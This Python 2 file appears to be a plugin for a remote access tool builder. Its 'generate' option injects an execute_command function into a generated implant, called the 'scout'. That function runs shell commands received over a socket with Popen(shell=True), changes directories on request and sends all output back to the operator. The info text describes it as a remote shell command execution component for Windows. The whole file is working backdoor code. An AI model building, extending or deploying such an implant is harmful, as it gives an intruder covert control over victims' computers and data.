#verified
import library.modules.config as config

config.main()

def main(option):
    if option == 'generate':
        config.import_statements.append('from subprocess import Popen, PIPE')
        config.import_statements.append('from os import chdir')
        config.functions.append('''
def execute_command(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        s.sendall("[+]Changed to directory : " + execute)
    else:
        result = Popen(execute, shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()        
        s.sendall('[+]Command output : \\n' + result)''')
        config.logics.append('''
            elif command == "exec":
                execute_command(data)''')
    elif option == 'info':
        print '\nName             : Execute command component' \
              '\nOS               : Windows' \
              '\nRequired Modules : subprocess' \
              '\nCommands         : exec' \
              '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands\n'